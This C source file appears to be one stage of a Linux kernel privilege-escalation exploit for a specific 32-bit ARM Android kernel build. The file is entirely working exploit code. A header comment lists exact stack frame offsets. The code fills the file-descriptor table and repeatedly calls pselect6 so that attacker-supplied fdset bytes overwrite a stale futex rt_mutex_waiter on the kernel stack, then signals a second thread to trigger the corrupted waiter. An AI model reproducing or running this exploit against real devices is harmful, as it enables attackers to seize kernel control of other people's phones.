/*
 * songyuan compat-pselect stack stamper (32-bit ARM only).
 *
 * Exact OS3.0.309.0.WGNMIXM kernel geometry:
 *
 *   __arm64_sys_futex_time32       frame 0x70
 *   do_futex                       frame 0x60
 *   futex_wait_requeue_pi          frame 0x1c0, waiter at sp + 0xa0
 *     stale waiter = syscall entry SP - 0x1f0
 *
 *   __arm64_compat_sys_pselect6_*  frame 0x40
 *   do_compat_pselect              frame 0x90
 *   compat_core_sys_select         frame 0x1b0, stack fdsets at sp + 0x40
 *     fdset buffer = syscall entry SP - 0x240
 *
 * The stale 0x70-byte rt_mutex_waiter therefore starts at fdset buffer+0x50.
 * With nfds=320 each kernel fdset is 40 bytes and the layout is:
 *
 *   +0x00 input read     +0x28 output read
 *   +0x50 input write    +0x78 output write
 *   +0xa0 input except   +0xc8 output except
 *
 * This is an exact fit for the nested 6.12 waiter. Input write controls
 * waiter[0x00..0x27], the kernel clears waiter[0x28..0x4f], and input
 * except controls waiter[0x50..0x6f].
 */
#define _GNU_SOURCE

#include <errno.h>
#include <fcntl.h>
#include <stdatomic.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <sys/syscall.h>
#include <unistd.h>

#include "kernelsnitch/utils.h"

#ifndef pr_debug
#define pr_debug(fmt, ...) ((void)0)
#endif

#ifndef __NR_pselect6_time64
#define __NR_pselect6_time64 413
#endif

extern atomic_int g_consumer_go;

#define EXP32_NFDS 320
#define EXP32_FDSET_BYTES (EXP32_NFDS / 8)
#define EXP32_STAMP_ROUNDS 64

struct kernel_timespec64 {
    int64_t tv_sec;
    int64_t tv_nsec;
};

static int populate_fd_table(void) {
    int seed = open("/dev/null", O_RDWR | O_CLOEXEC);
    if (seed < 0)
        return -1;

    for (int wanted = 0; wanted < EXP32_NFDS;) {
        if (fcntl(wanted, F_GETFD) >= 0) {
            wanted++;
            continue;
        }
        int fd = fcntl(seed, F_DUPFD_CLOEXEC, wanted);
        if (fd < 0) {
            close(seed);
            return -1;
        }
        wanted = fd + 1;
    }
    return seed;
}

static long stamp_once(const uint8_t *waiter) {
    uint8_t write_set[EXP32_FDSET_BYTES];
    uint8_t except_set[EXP32_FDSET_BYTES];
    struct kernel_timespec64 timeout = { .tv_sec = 0, .tv_nsec = 0 };

    /* waiter[0..0x27] -> input write; waiter[0x50..0x6f] -> input except. */
    memcpy(write_set, waiter, sizeof(write_set));
    memcpy(except_set, waiter + 0x50, 0x20);
    memset(except_set + 0x20, 0, sizeof(except_set) - 0x20);

    return syscall(__NR_pselect6_time64, EXP32_NFDS, NULL, write_set,
                   except_set, &timeout, NULL);
}

void do_stamp_stack(uint64_t *buf) {
    int seed = populate_fd_table();
    if (seed < 0) {
        pr_warning("compat pselect: fd table setup failed errno=%d\n", errno);
        _exit(1);
    }

    errno = 0;
    long probe = stamp_once((const uint8_t *)buf);
    pr_info("compat pselect probe: ret=%ld errno=%d nfds=%d\n",
            probe, errno, EXP32_NFDS);

    /* No syscall may occur after the final stamp and before the consumer
     * fires: another kernel frame on this thread can overwrite the waiter. */
    for (int i = 0; i < EXP32_STAMP_ROUNDS; i++)
        stamp_once((const uint8_t *)buf);

    atomic_store(&g_consumer_go, 1);
    for (;;)
        __asm__ volatile("nop" ::: "memory");
}
